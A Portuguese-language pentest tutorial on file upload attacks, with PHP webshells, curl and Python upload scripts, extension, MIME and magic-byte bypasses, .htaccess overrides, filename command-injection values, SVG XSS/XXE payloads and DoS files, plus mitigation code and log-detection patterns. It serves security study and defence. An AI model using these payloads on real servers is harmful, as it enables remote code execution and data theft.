---
title: "File Upload"
---

# File Upload Attacks

## A Falha: Validação de Tipo de Arquivo Baseada em Atributos Controláveis pelo Atacante

File Upload attacks ocorrem quando a validação do tipo de arquivo é feita com base em atributos que o atacante controla diretamente — extensão do arquivo, header `Content-Type`, ou magic bytes — em vez de ser feita onde importa: no contexto de execução do servidor.

A suposição de design incorreta: o desenvolvedor valida o tipo de arquivo no upload e acredita que, se a extensão for `.jpg` e o `Content-Type` for `image/jpeg`, o arquivo é uma imagem. Mas extensão é texto no nome do arquivo — o atacante pode escolher qualquer extensão. `Content-Type` é um header HTTP — o atacante envia o request e controla todos os headers. Magic bytes são os primeiros bytes do arquivo — o atacante controla o conteúdo completo do arquivo.

**Por que o desenvolvedor cria essa falha**: a forma natural de implementar validação de upload é checar o que está disponível de forma imediata — a extensão do arquivo informada pelo browser e o `Content-Type` do request. Essas informações parecem vir do sistema operacional do cliente e do browser, o que cria uma falsa sensação de que são confiáveis. O desenvolvedor valida "onde pode acessar" em vez de "onde a segurança de fato precisa acontecer".

**O problema central**: a validação ocorre no momento do upload, mas o risco acontece no momento da execução. Um arquivo `.php` com `Content-Type: image/jpeg` ainda é código PHP quando o servidor web o executa. A validação precisa garantir que o arquivo não seja executável, independente de como ele foi apresentado no upload.

```php
// VULNERÁVEL — valida apenas Content-Type (controlado pelo atacante)
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$content_type = $_FILES['file']['type'];   // vem do request HTTP — controlável
if (!in_array($content_type, $allowed_types)) {
    die('Tipo não permitido');
}
// Atacante envia shell.php com header Content-Type: image/jpeg
// Validação passa, shell.php é salvo e executável

// VULNERÁVEL — valida apenas extensão
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$allowed_ext = ['jpg', 'png', 'gif'];
if (!in_array(strtolower($ext), $allowed_ext)) {
    die('Extensão não permitida');
}
// Atacante envia shell.phtml, shell.php5, shell.PHP — extensões alternativas

// SEGURO — validação em múltiplas camadas que o atacante não controla
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);  // analisa conteúdo real
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die('Tipo inválido');
}
// Além disso: salvar fora do webroot ou desabilitar execução no diretório de uploads
// E randomizar o nome do arquivo para impedir acesso direto
```

**Consequência real**: o atacante faz upload de um webshell — um arquivo PHP com `system($_GET["cmd"])` — que é salvo no diretório de uploads. Ao acessar `http://alvo.com/uploads/shell.php?cmd=id`, obtém RCE com os privilégios do processo web. A partir disso: leitura de arquivos de configuração, acesso a banco de dados, reverse shell, pivotamento na rede interna.

---

## Causa Raiz

A causa raiz é a separação entre onde a validação ocorre e onde a execução ocorre.

O servidor web executa arquivos com base na configuração de handlers — se o diretório `/uploads/` está configurado para servir PHP, qualquer arquivo com extensão `.php` (ou `.phtml`, `.php5`, etc.) será executado como código, independente de como foi validado no upload.

A validação precisa ser feita em dois lugares:
1. No conteúdo do arquivo (não em metadados controláveis pelo atacante)
2. Na configuração do servidor (impedir execução no diretório de uploads)

```apache
# VULNERÁVEL — uploads acessíveis e executáveis
<Directory "/var/www/html/uploads">
    # nenhuma restrição — PHP executa normalmente aqui
</Directory>

# SEGURO — bloquear execução no diretório de uploads
<Directory "/var/www/html/uploads">
    php_flag engine off
    Options -ExecCGI
    AddHandler default-handler .php .phtml .php3 .php4 .php5 .phar
</Directory>
```

```nginx
# Nginx — SEGURO: bloquear execução em uploads
location /uploads {
    location ~ \.php$ { deny all; }
    location ~ \.(phtml|php3|php4|php5|phar)$ { deny all; }
}
```

Mesmo com configuração segura do servidor, também é necessário:
- Randomizar o nome do arquivo salvo (impede acesso direto mesmo que o atacante saiba o nome original)
- Salvar fora do webroot quando possível
- Servir arquivos de upload via código PHP com headers adequados, não diretamente pelo servidor web

---

## Discovery

### Identificar Funcionalidades de Upload

```bash
# Buscar endpoints de upload com ffuf
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://alvo.com/FUZZ" \
     -mc 200,301,302 | grep -i "upload\|file\|attach"

# Parâmetros comuns em formulários
# name="file", name="upload", name="attachment", name="image", name="document"
```

### Verificar Configuração do Servidor

```bash
# Testar se uploads são executáveis
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@test.php" \
     -F "submit=1"

# Verificar diretório de uploads
# /uploads/, /files/, /media/, /images/, /attachments/, /tmp/
```

---

## Exploitation

### 1. Upload Direto (sem validação)

```bash
# Webshell PHP simples
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@shell.php" | grep -i "upload\|success\|path"

# Acessar webshell
curl -s "http://alvo.com/uploads/shell.php?cmd=id"
curl -s "http://alvo.com/uploads/shell.php?cmd=cat+/etc/passwd"
```

### 2. Bypass de Blacklist de Extensões

Servidores que bloqueiam `.php` mas aceitam extensões alternativas:

```
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.phps
shell.shtml
shell.pHp      (case variation)
shell.PHP
shell.Php
```

```bash
for ext in php3 php4 php5 php7 phtml phar phps shtml; do
    curl -s -X POST "http://alvo.com/upload.php" \
         -F "file=@shell.$ext" \
         -o /dev/null -w "Extension $ext: %{http_code}\n"
done
```

### 3. Bypass de Whitelist — Double Extension

```bash
# Servidor permite apenas .jpg mas executa .php
# Double extension — o Apache/PHP pode executar o segundo
shell.jpg.php
shell.php.jpg          # se o servidor usa apenas o último segmento
shell.php%00.jpg       # null byte para truncar
shell.php\x00.jpg
```

### 4. Bypass de Content-Type (MIME)

Burp Suite: interceptar a requisição de upload e modificar o header `Content-Type`:

```http
POST /upload.php HTTP/1.1
Host: alvo.com
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary

-----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          <-- MODIFICAR AQUI

<?php system($_GET["cmd"]); ?>
-----WebKitFormBoundary--
```

```bash
# Via curl — forçar Content-Type de imagem
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@shell.php;type=image/jpeg"
```

### 5. Bypass de Magic Bytes (File Signature)

O servidor lê os primeiros bytes do arquivo para verificar o tipo real. Adicionar bytes mágicos de imagem antes do payload PHP engana essa verificação — mas o arquivo ainda é executado como PHP pelo servidor web se tiver extensão correta.

```bash
# Prepend GIF header
echo 'GIF8' > shell.gif.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php

# Alternativa com printf
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif

# Usando exiftool para injetar em imagem real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real_image.jpg
mv real_image.jpg shell.jpg.php
```

**Magic bytes comuns**:
```
GIF8        -- GIF (47 49 46 38)
\xff\xd8\xff  -- JPEG (FF D8 FF)
\x89PNG     -- PNG (89 50 4E 47)
PK          -- ZIP (50 4B)
%PDF        -- PDF (25 50 44 46)
```

### 6. Injeção no Nome do Arquivo

O nome do arquivo pode ser usado pelo servidor de maneiras inseguras — exibido em HTML sem encode, passado para comandos de sistema, usado para construir paths.

```bash
# Command injection no nome do arquivo
file$(whoami).jpg
file`id`.jpg
file.jpg||whoami
file.jpg;id
file.jpg|id

# Path traversal no nome
../../etc/cron.d/shell.php
../../../var/www/html/shell.php

# XSS no nome do arquivo (se exibido sem encode)
<img src=x onerror=alert(1)>.jpg
"><script>alert(1)</script>.jpg

# Null byte
shell.php%00.jpg
```

### 7. Ataques via SVG

SVG é XML — permite XSS e XXE em aplicações que exibem SVGs.

**XSS via SVG**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**XXE via SVG — leitura de arquivo**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <text>&xxe;</text>
</svg>
```

**XXE via SVG — código fonte PHP**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <text>&xxe;</text>
</svg>
```

### 8. Injeção de Caracteres Especiais no Nome

Lista completa de caracteres para injetar no nome do arquivo:

```
%20           -- espaço
%0a           -- newline
%00           -- null byte
%0d0a         -- CRLF
/             -- path separator
.\            -- Windows path
.             -- ponto extra
...           -- pontos múltiplos
:             -- Windows ADS (Alternate Data Stream)
::$data       -- ADS específico
```

```bash
# Exemplo: null byte bypass
curl -s -X POST "http://alvo.com/upload.php" \
     -F $'file=@shell.php\0.jpg'
```

---

## Bypass de Validações Combinadas

Quando o servidor valida múltiplas coisas simultaneamente:

```bash
# Webshell com header GIF, extensão .php5, Content-Type de imagem
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell_bypass.php5
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@shell_bypass.php5;type=image/gif"
```

### Bypass via .htaccess Upload

Se o servidor permite upload de `.htaccess`:

```bash
# Criar .htaccess que faz o servidor executar .jpg como PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@.htaccess"

# Agora qualquer .jpg é executado como PHP
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@shell.jpg"
curl -s "http://alvo.com/uploads/shell.jpg?cmd=id"
```

---

## Ataques Indiretos (Sem RCE)

### ZIP Bomb (Negação de Serviço)

```bash
# Criar arquivo que expande massivamente
dd if=/dev/zero bs=1M count=1024 | gzip > bomb.gz
# Renomear para formato aceito
mv bomb.gz bomb.pdf
```

### Pixel Flood (Image DOS)

```python
# Criar PNG com dimensões enormes mas tamanho pequeno
from PIL import Image
img = Image.new('RGB', (0xffff, 0xffff))
img.save('pixel_flood.png')
```

### Upload para Sobrescrever Arquivos

```bash
# Se o servidor salva com nome original
# Fazer upload de arquivo com mesmo nome de arquivo crítico
curl -s -X POST "http://alvo.com/upload.php" \
     -F "file=@.htaccess"     # sobrescrever htaccess
     -F "file=@index.php"     # sobrescrever página principal
```

---

## Automação

### Fuzz de Extensões com Burp Intruder

1. Interceptar requisição de upload no Burp
2. Enviar para Intruder
3. Marcar a extensão do arquivo como posição
4. Usar wordlist de extensões PHP:
```
php, php3, php4, php5, php7, phtml, phar, phps, shtml, php.jpg, pHp, PHP
```

### Script Python para Upload Automatizado

```python
import requests

url = "http://alvo.com/upload.php"
extensions = ['php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phar', 'shtml']
payload = '<?php system($_GET["cmd"]); ?>'

for ext in extensions:
    filename = f"shell.{ext}"
    files = {'file': (filename, payload, 'image/jpeg')}
    r = requests.post(url, files=files)
    if 'success' in r.text.lower() or r.status_code == 200:
        print(f"[+] Upload com {ext} pode ter funcionado!")
        print(f"    Tente: http://alvo.com/uploads/shell.{ext}?cmd=id")
```

---

## Detecção e Mitigação

### Logs de Upload

```bash
# Buscar uploads com extensões PHP
grep -E "\.(php|phtml|php3|php5|phar)" /var/log/apache2/access.log

# Buscar acessos ao diretório de uploads com parâmetros suspeitos
grep "uploads.*cmd=" /var/log/apache2/access.log

# Buscar nomes suspeitos
grep -E "shell|webshell|cmd|exec" /var/log/apache2/access.log
```

### Defesa em Profundidade

```php
// 1. Validar extensão com whitelist
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die('Extensão não permitida');
}

// 2. Validar MIME real via análise do conteúdo do arquivo
// (não o Content-Type do request — esse é controlado pelo atacante)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die('Tipo de arquivo inválido');
}

// 3. Randomizar nome do arquivo — impede acesso direto mesmo que upload funcione
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $new_name);

// 4. Ideal: salvar fora do webroot e servir via script PHP
// move_uploaded_file($_FILES['file']['tmp_name'], '/var/storage/' . $new_name);
// Para servir: readfile('/var/storage/' . $new_name);
```

**Configurações de servidor Apache**:
```apache
# Desabilitar execução PHP no diretório de uploads
<Directory "/var/www/html/uploads">
    php_flag engine off
    Options -ExecCGI
    AddHandler default-handler .php .phtml .php3
</Directory>
```

```nginx
# Nginx — bloquear execução em uploads
location /uploads {
    location ~ \.php$ { deny all; }
}
```

---

## Cheatsheet Rápido

| Técnica | Payload/Ação |
|---------|-------------|
| Upload direto | `shell.php` com `system($_GET["cmd"])` |
| Extensão alternativa | `.php5`, `.phtml`, `.phar`, `.shtml` |
| Double extension | `shell.jpg.php`, `shell.php.jpg` |
| Content-Type bypass | Mudar para `image/jpeg` no Burp |
| Magic bytes GIF | `printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif` |
| exiftool inject | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg` |
| SVG XSS | `<script>alert(window.origin)</script>` no SVG |
| SVG XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| Null byte | `shell.php%00.jpg` |
| Filename injection | `file$(whoami).jpg` |

---

## Módulos Relacionados

File Upload e LFI formam uma combinação clássica: o upload coloca o arquivo malicioso no servidor e o LFI o inclui para execução via zip wrapper ou log poisoning — ver `01_file_inclusion.md`. Upload de SVG é um vetor direto para XXE porque o arquivo aparentemente benigno pode conter XML com entidades externas que o parser processa ao renderizar a imagem; com `Content-Type: image/svg+xml`, o mesmo SVG com `<script>` resulta em XSS armazenado. Quando o servidor usa o nome do arquivo original em chamadas de sistema, injeção no nome do arquivo pode escalar para Command Injection.

**Referências externas:** HTB Bug Bounty Hunter Path — File Upload Attacks (módulo 11) · PayloadsAllTheThings: Upload Insecure Files · HackTricks: File Upload · OWASP: Unrestricted File Upload
